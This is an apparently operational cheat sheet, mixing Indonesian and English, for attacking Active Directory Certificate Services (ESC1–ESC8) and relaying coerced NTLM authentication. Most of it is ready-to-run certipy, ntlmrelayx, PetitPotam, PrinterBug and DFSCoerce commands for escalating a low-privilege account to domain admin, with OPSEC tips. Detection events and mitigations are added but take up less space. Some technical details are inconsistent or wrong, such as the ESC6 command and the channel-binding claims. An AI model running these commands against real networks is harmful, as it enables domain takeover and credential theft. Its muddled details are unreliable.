# ad-cs-relay — ad

# AD CS & NTLM Relay — ESC1–ESC8 Reference + Coercion + Relay

## 1. Scenario Summary Table

| ID | Target | Abuse | Auth dibutuhkan | Coercion source | Tool |
|---|---|---|---|---|---|
| ESC1 | Template misconfig | SAN arbitrary + Client Auth EKU | User enroll | — | certipy req |
| ESC2 | Any Purpose / SubCA EKU | Enroll → auth as anyone | User enroll | — | certipy req |
| ESC3 | Enrollment Agent | Agent cert → enroll as victim | User enroll | — | certipy req (2 stage) |
| ESC4 | Template ACL writable | Tulis ulang template → ESC1 | Write on template | — | certipy template |
| ESC5 | PKI ACL | CA object control | Write on CA | — | certipy ca / modify |
| ESC6 | CA `EDITF_ATTRIBUTESUBJECTALTNAME2` | SAN in all requests | User enroll | — | certipy req |
| ESC7 | CA officer rights | Approve pending / manage CA | ManageCA | — | certipy ca |
| ESC8 | HTTP enrollment + NTLM | Relay to `/certsrv/` | Machine/user NTLM | PetitPotam, PrinterBug, DFSCoerce | ntlmrelayx |

Tooling baseline: **certipy 4.x** (`pip install certipy-ad`), **impacket 0.12.x**, **petitpotam / printerbug / dfscoerce**, **Responder**, **ntlmrelayx.py**. Target DC Server 2019/2022 + ADCS Windows Server 2019/2022.

## 2. Enumerasi Awal

```bash
# Temukan CA + template rentan
certipy find -u user@corp.local -p 'P@ss' -dc-ip 10.0.0.10 -vulnerable -stdout

# Semua template + ACL
certipy find -u user@corp.local -p 'P@ss' -dc-ip 10.0.0.10 -json -output adcs

# Cek Web Enrollment (penting untuk ESC8)
curl -sk -I https://ca.corp.local/certsrv/ -o /dev/null -w '%{http_code}\n'
# 401 = NTLM aktif → ESC8 feasible
```

What to look for in the output of `certipy find -vulnerable`:
- `[!] Vulnerabilities: ESC1` in the template → `msPKI-Certificate-Name-Flag = CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`
- `EKUs: Client Authentication` or `Any Purpose` or `SubCA`
- `Enrollment Rights` → siapa bisa enroll (Domain Users / Domain Computers)
- CA flags: `EDITF_ATTRIBUTESUBJECTALTNAME2` → ESC6

## 3. ESC1 — SAN Abuse

**What is sent:** CSR with `SAN=administrator@corp.local` + UPN spoofing. The template allows enrollee supply subject, and EKU Client Auth.

```bash
# Request sebagai low-priv user
certipy req -u 'lowuser@corp.local' -p 'P@ss' \
  -ca 'CORP-CA' -template 'VulnTemplate' \
  -upn 'administrator@corp.local' \
  -dc-ip 10.0.0.10 -target ca.corp.local

# Output: administrator.pfx
certipy auth -pfx administrator.pfx -dc-ip 10.0.0.10
# → NT hash administrator

# UnPAC the hash jika PKINIT disabled
certipy auth -pfx administrator.pfx -dc-ip 10.0.0.10 -domain corp.local -username administrator
```

**Why it fails:**
- Template flag `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` off → SAN ignored → cert = lowuser, not admin → PKINIT as lowuser (not privilege escalation).
- `-upn` without `-sid` on Server 2022 + patch CVE-2022-26923 (KB5014754) → StrongCertificateBindingEnforcement = 2 → cert rejected for auth if the SID does not match.

**Bypass SID binding (if still 0/1):**

```bash
certipy req -u 'lowuser@corp.local' -p 'P@ss' \
  -ca 'CORP-CA' -template 'VulnTemplate' \
  -upn 'administrator@corp.local' \
  -sid 'S-1-5-21-...-500' \
  -dc-ip 10.0.0.10
```

## 4. ESC3 — Enrollment Agent

Two stages. First enroll a cert with the EKU `Certificate Request Agent`, then use it to sign a request on behalf of the victim.

```bash
# Stage 1: agent cert
certipy req -u 'lowuser@corp.local' -p 'P@ss' -ca CORP-CA \
  -template 'AgentTemplate' -dc-ip 10.0.0.10
# → lowuser.pfx

# Stage 2: on-behalf-of
certipy req -u 'lowuser@corp.local' -p 'P@ss' -ca CORP-CA \
  -template 'UserTemplate' \
  -on-behalf-of 'CORP\administrator' \
  -pfx lowuser.pfx -dc-ip 10.0.0.10
# → administrator.pfx
```

**Prerequisites often missed:** enrollment agent requires the target template to have `Authorized Signatures = 1` and `Application Policies = Client Auth`, and the agent cert must still be valid + EKU `1.3.6.1.4.1.311.20.2.1`.

## 5. ESC4 — Template ACL Writable

If lowuser has `WriteProperty`/`GenericAll` on the template:

```bash
# Backup, modifikasi → ESC1
certipy template -u 'lowuser@corp.local' -p 'P@ss' -dc-ip 10.0.0.10 \
  -template 'TargetTemplate' -save-old

# Set flag enrollee-supplies-subject + Client Auth
certipy template -u 'lowuser@corp.local' -p 'P@ss' -dc-ip 10.0.0.10 \
  -template 'TargetTemplate' \
  -write-default-configuration \
  -no-save

# Atau eksplisit: ubah msPKI-Certificate-Name-Flag
# Restore
certipy template -u 'lowuser@corp.local' -p 'P@ss' -dc-ip 10.0.0.10 \
  -template 'TargetTemplate' -write-configuration TargetTemplate.json -no-save
```

**Effect:** the template becomes ESC1-exploitable. Restore is mandatory to maintain OPSEC.

## 6. ESC5 / ESC7 (Kontrol CA)

```bash
# ESC7: ManageCA → approve request pending
certipy ca -u 'lowuser@corp.local' -p 'P@ss' -ca 'CORP-CA' \
  -dc-ip 10.0.0.10 -issue-request <REQ_ID>

# Grant self as officer (jika ManageCA)
certipy ca -u 'lowuser@corp.local' -p 'P@ss' -ca 'CORP-CA' \
  -dc-ip 10.0.0.10 -add-officer 'lowuser'

# Enable EDITF_ATTRIBUTESUBJECTALTNAME2 (ESC6 via ManageCA)
certipy ca -u 'lowuser@corp.local' -p 'P@ss' -ca 'CORP-CA' \
  -dc-ip 10.0.0.10 -enable-template SubCA

# ESC5: generic write ke CA object di AD
# → modifikasi attribute (mis. tambah template) via dacledit + certipy ca
```

## 7. ESC8 — Relay to HTTP Enrollment

**What is sent:** NTLM negotiate/authenticate from the victim machine forced to connect to us, then relayed to `http://CA/certsrv/certfnsh.asp` (HTTP, NTLM). The return is a cert for the victim machine account → PKINIT → NT hash of machine acct → often instant domain admin path (DC machine acct).

**Success conditions:**
- Web Enrollment (`/certsrv/`) allows NTLM (default HTTP, not HTTPS if Extended Protection off).
- `Extended Protection = Off` on IIS ADCS (default until patched 2022).
- `Machine` or `DomainController` template allows enrollee name/account → cert with `dNSName` = victim hostname.

```bash
# 1. Start ntlmrelayx ke ADCS HTTP endpoints
ntlmrelayx.py -t http://ca.corp.local/certsrv/certfnsh.asp \
  -smb2support --adcs --template DomainController -debug

# 2. Coerce DC/machine
python3 PetitPotam.py -u lowuser -p P@ss -d corp.local \
  10.0.0.50 10.0.0.10

# 3. ntlmrelayx men-dump base64 cert
# 4. Cert → TGT
certipy auth -pfx dc01.pfx -dc-ip 10.0.0.10
```

**HTTP-only variant (coerce to WebDAV):** browse the victim to our URL via `\@80/` syntax → relay to `/certsrv/`. Suitable for hosts without SMB signing.

## 8. Coercion Matrix

| Technique | Protocol | Port | Function | Prerequisites |
|---|---|---|---|---|
| PetitPotam | MS-EFSRPC | 445 (pipe `lsarpc`) | `EfsRpcOpenFileRaw` → machine auth to attacker | EFSRPC not patched or anon bind |
| PrinterBug | MS-RPRN | 445 (spoolss) | `RpcRemoteFindFirstPrinterChangeNotification` | Spooler running, not patched |
| DFSCoerce | MS-DFSNM | 445 (netdfs) | `NetrDfsRemoveStdRoot` | Only requires bind + valid creds |
| ShadowCoerce | MS-FSRVP | 445 | `IsPathSupported` | FSRVP service |
| MSEven | MS-EVEN | 445 | `ElfrOpenBELW` | Patched on 2019+ |

```bash
# PetitPotam — anonymous
python3 PetitPotam.py 10.0.0.50 10.0.0.10

# PetitPotam — authed (bypass anon-bind patch)
python3 PetitPotam.py -u lowuser -p P@ss -d corp.local 10.0.0.50 10.0.0.10

# PrinterBug
python3 printerbug.py corp.local/lowuser:P@ss@10.0.0.10 10.0.0.50

# DFSCoerce (paling stabil December 2024, working Server 2022 21H2)
python3 dfscoerce.py -u lowuser -p P@ss -d corp.local 10.0.0.50 10.0.0.10
```

**Every coercion sends**: `SMB → \\10.0.0.50\IPC$` (SYSTEM logon NTLM). **What appears**: SMB Type 3 logon with the victim workstation name, captured in Responder/ntlmrelayx.

**Why it fails:** Spooler already disabled on DC (default since Oct 2022), PetitPotam patched on Server 2019/2022 (KB5005413 + later), DFSCoerce requires `lsarpc` open but SMB signing enforced → SMB to SMB relay dead. **Fix:** force NTLM to HTTP target (relay to LDAP/HTTP bypasses SMB signing).

## 9. ntlmrelayx Targets — LDAP/LDAPS/SMB/HTTP

### 9.1 LDAP (post-auth — RBCD / shadow cred)

```bash
# Relay ke LDAP (SMB signing irrelevant, LDAP signing != channel binding unless EPA)
ntlmrelayx.py -t ldap://dc01.corp.local -smb2support \
  --delegate-access --escalate-user lowuser
# Berhasil → RBCD di target computer account untuk lowuser → S4U2Proxy → DA
```

**Prerequisites:** LDAP signing **disabled** OR **LDAP channel binding off** (default pre-2019). Server 2019+ default `LdapEnforceChannelBinding=1` → relay to LDAPS **fails** unless `--remove-mic` + channel-binding bypass is absent. **LDAP plain 389 without signing** is the most reliable target.

### 9.2 LDAPS

```bash
ntlmrelayx.py -t ldaps://dc01.corp.local -smb2support \
  --add-computer 'EVILPC$' 'P@ss123' --delegate-access
# Gagal jika channel binding=Required. Cek:
# reg query "HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters" /v LdapEnforceChannelBinding
```

LDAPS almost always **requires** channel binding (KB4520412 default = 1 since 2020) → only works if the admin explicitly set it to 0.

### 9.3 SMB

```bash
# Relay SMB → SMB (butuh signing off di target)
ntlmrelayx.py -t smb://10.0.0.20 -smb2support -socks
# Kerap gagal: Windows 11 24H2 & Server 2025 → SMB signing default enforced
```

**Windows 11 24H2 / Server 2025:** SMB signing default **required** on all connections → SMB→SMB relay **completely dead** for new targets. Check via `netexec smb 10.0.0.0/24 --gen-relay-list relay.txt` (only hosts without `signing:False` go into the list).

### 9.4 HTTP (IIS internal)

```bash
ntlmrelayx.py -t http://intranet.corp.local/ -smb2support -socks
# Gunakan SOCKS untuk lateral via proxychains
```

## 10. Shadow Credentials (alternatif relay LDAP)

If LDAP relay succeeds but RBCD is blocked, use `msDS-KeyCredentialLink`:

```bash
# Direct (pakai creds sendiri)
certipy shadow auto -u lowuser@corp.local -p 'P@ss' \
  -account 'targetpc$' -dc-ip 10.0.0.10
# → targetpc.ccache + NT hash

# Via relay LDAP
ntlmrelayx.py -t ldap://dc01.corp.local -smb2support --shadow-credentials \
  --shadow-target 'targetpc$'
```

**Why it fails:** `msDS-KeyCredentialLink` write requires `GenericWrite`; LDAP relay as a machine account does not automatically gain write on itself unless the attacker targets **another account** (RBCD-style) via `--escalate-user`. Also: PKINIT must be enabled in the domain (default = enabled), and the 2022 `StrongCertificateBindingEnforcement` patch can reject the cert if there is a SID mismatch.

## 11. Signing-Required Bypass Matrix

| Sumber NTLM | Target relay | SMB signing | LDAP signing | EPA (HTTP) | Bypass |
|---|---|---|---|---|---|
| SMB coerced | HTTP `/certsrv/` | irrelevant | irrelevant | Off | ✅ default ESC8 path |
| SMB coerced | LDAP 389 | irrelevant | Off | — | ✅ `--remove-mic` not needed |
| SMB coerced | LDAPS 636 | irrelevant | On (binding) | — | ❌ on 2019+ default |
| SMB coerced | SMB | Off | — | — | ✅ but rare on 24H2 |
| HTTP WebDAV | SMB | Off | — | — | ✅ via `\\@80\` |
| HTTP coerced (ProxyLogon-style) | HTTP IIS | — | — | Off | ✅ |

**Key:** signing-required on SMB only blocks **SMB→SMB relay**. SMB→HTTP/LDAP relay is not affected by signing. What blocks LDAP relay is **LDAP channel binding** (not signing) — patches that admins often confuse. Check:

```bash
# SMB signing state
netexec smb 10.0.0.0/24 --gen-relay-list relay.txt

# LDAP signing via registry (dari host DC)
reg query HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters /v LdapEnforceChannelBinding
# 0 = never, 1 = when supported, 2 = always (default 2019+ = 1)
# Signing: LDAPServerIntegrity = 2 = required (default 2020+)
```

## 12. WSUS / ADWS Relay (sering terlewat)

### 12.1 WSUS (HTTP, NTLM to `wsus.corp.local:8530`)

WSUS clients auth via `Authorization: NTLM` to port 8530 (HTTP) or 8531 (HTTPS). If `wsus.corp.local` resolves to the attacker (via `--remove-mic` + WPAD or DNS poisoning):

```bash
ntlmrelayx.py -t http://wsus.corp.local:8530/ -smb2support -socks
# Coerce WSUS client (mesin dgn GPO WSUS) → proxy NTLM → gunakan
proxychains curl --ntlm -u ':' -s http://wsus.corp.local:8530/ClientWebService/client.asmx
```

WSUS combination → PsExec/C2 distribution if the attacker controls it with the `--wsus` plugin (**pywsus**). Injects a payload if the `wsus` cert has not been pinned.

### 12.2 ADWS (port 9389, TCP)

ADWS uses NTLM. Relay to ADWS does not directly give write, but can be chained for enumeration / click-once if the `ADWS` service is misconfigured. Running by default on Server 2008R2+. Use only as a SOCKS pivot, not a primary escalation.

## 13. Verification & Effects

| Step | What appears in the log |
|---|---|
| `certipy req` | Event 4886/4887 on the CA (cert issued). Logon 4624 Type 3 PKINIT from attacker IP. |
| `ntlmrelayx` → `/certsrv/` | IIS log 401 → 200 on `certfnsh.asp`, `CertSvc` 4886 with `RequesterName` = victim machine, `Subject` = victim machine |
| PetitPotam | Event 4624 SMB inbound to attacker, `lsarpc` EFSRPC on target (Task Scheduler trace) |
| PrinterBug | Spooler Event 808 (RpcRemoteFindFirstPrinterChangeNotification) |
| DFSCoerce | Event 5145 / 5140 share access netdfs |
| Shadow creds | Event 5136 modify msDS-KeyCredentialLink on target |

## 14. Commonly Missed Mitigations

1. **Web Enrollment must use HTTPS + Extended Protection = Required** (IIS → Site → Authentication → Windows Auth → Advanced → Extended Protection = Required). Without this, ESC8 still works even if other patches are complete.
2. **Disable Web Enrollment if not used**: `Remove-WindowsFeature Adcs-Web-Enrollment`. Often forgotten because "it is used for mobile cert".
3. **`EDITF_ATTRIBUTESUBJECTALTNAME2` must be OFF** — check `certutil -getreg CA\EditFlags`. Often once-on-forever after an admin enables it for legacy VPN (Pulse/Ivanti).
4. **Template audit**: a template with `ENROLLEE_SUPPLIES_SUBJECT` + ClientAuth EKU + `Domain Users` enroll = ESC1. Use [Certify/Certipy `-vulnerable`] **scheduled** as a check, not once.
5. **Revocation is not enough** — after a cert is stolen, `Revoke` has no effect on PKINIT until the **CRL is republished** and the client **checks the CRL**. The attacker can use the cert for up to 1 year by default.
6. **LDAP channel binding = Required even though it looks secure** — however the Server 2022 patch can be rolled back to 0 for legacy apps (Jira, Atlassian). This is the LDAPS relay door left open.
7. **PetitPotam named-pipe path `efsrpc`** — blocking `lsarpc` at the firewall is often considered "PetitPotam mitigation", even though `efsrpc` is still open. Block **both pipes** or patch.
8. **Shadow credentials mitigation** — set `ms-DS-KeyCredentialLink` write only to DC admins, and enable 5136 event audit. Generally not monitored.
9. **SMB signing for everyone** — the AD groups `Domain Controllers` and `Domain Computers` policy `Microsoft network server: Digitally sign communications (always)` in GPO **is not default for non-DC servers until Server 2025**. Windows 11 24H2 default on.
10. **WSUS over HTTPS + cert pinning + disable client NTLM** via GPO `Allow Basic authentication` = disabled and `Enable HTTP auth` = off.
11. **Disable Spooler on DCs and multi-purpose servers** via GPO `Computer Config → Admin Templates → Printers → Disallow spooler`. It is already default on Win10 22H2+ DCs but **not necessarily** on Server 2019.
12. **Audit CA ACL** — unnecessary CS operators must have `Issue and Manage Certificates` revoked. ESC7 is rarely checked because it only appears in the latest certipy find.
13. **PKINIT+StrongCertificateBindingEnforcement** on 2022/2025 DCs default = **2 (Enforce)** after the Feb 2025 patch — blocks ESC1 via SID mismatch on old certs. Check `reg query HKLM\SYSTEM\CurrentControlSet\Services\Kdc /v StrongCertificateBindingEnforcement`.
14. **Timestamps**: certipy `find` displays the template `Modified`; if the CA caches the template until restart (`Certsrv` caches for 10 minutes), ESC4 modifications are not immediately effective — restart the service or wait.

## 15. Field Operational Pitfalls

- **ntlmrelayx + `--adcs` requires `--template` to match the CA**; if using a template name other than `Machine` (e.g. custom `Workstations`), the request will 400 and the cert will not appear — check `certipy find -enabled`.
- **`-target http://ca/certsrv/`** must point to the **Web Enrollment root**, not `/certsrv/certfnsh.asp` — ntlmrelayx automatically appends the path. Writing the full path = relay auth failure.
- **PetitPotam against patched 2019+ DCs** returns `RPC_E_DISCONNECTED` or `access denied` during the session; do not waste time — move to DFSCoerce (still works on 21H2). DFSCoerce fails on 22H2+ (`RPC_S_INVALID_BINDING`) — fall back to PrinterBug if the spooler is running.
- **Running `ntlmrelayx` on `0.0.0.0:445`** hijacks the attacker host's SMB; during coercion, the victim connects to the attacker **via port 445** — ensure the attacker host firewall allows inbound 445, and no other "SMB server" icon is running.
- **Responder `SMB=On` + ntlmrelayx** conflict: turn off `SMB` in Responder.conf, leave `HTTP=On` for WebDAV coercion.
- **PKINIT disabled on the user** (`msDS-User-AccountControl` "Smartcard required") — `certipy auth` succeeds for TGT but `UnPAC` (NT hash) fails. Admin hit still works, but sometimes external tooling needs the hash; use `-no-hash` and directly use the ccache.
- **`certipy req` to ESC1 on a CA that requires approval** (`msPKI-Enrollment-Flag = PEND_ALL_REQUESTS`): the cert goes into the queue, the request ID is returned, do not be confused by "no cert" — run `certipy ca -list-requests` and approve if ESC7.
- **UTF-16 in SAN**: certipy default already handles it, but `-upn` with a `DOLLAR$` machine account on a User template = fails; machine acct needs a Machine template or `-upn hostname$` with a template that accepts dNSName+computer EKU.
- **`certipy find` in an environment with CA RPC blocked**: fall back to `-ldap-shell` on 389 or `--dc-only` (4.8+); do not assume "no vuln" if the RPC scan times out.
- **LDAPI relay target (LDAP over IPC)**: modern `certipy` supports it, but only if the CA is active and the attacker has local credentials to the target — different from network relay. Do not mix them.
- **PtH to CA HTTP is not possible** — ESC8 requires a **real NTLM handshake**, not hash injection. Relay from a coerced session or from a WDIGEST downgrade (force media via WCCP).
- **NTP skew**: `certipy auth` PKINIT and AES Kerberos require skew <5 minutes. In lab snapshots or cloud it is often wrong — `w32tm /resync` on attacker or `chrony` sync to target.
- **CA Web Enrollment bound to `Default Web Site` (80)** — if admin moves to 443 with TLS, and Extended Protection off, ESC8 still works but target must be `https://ca.corp.local/certsrv/`; if self-signed, ntlmrelayx error `certificate verify failed` → add `--http-trust` (impacket 0.11+ option `--insecure` for HTTP client).

---

## [reasoning trace]


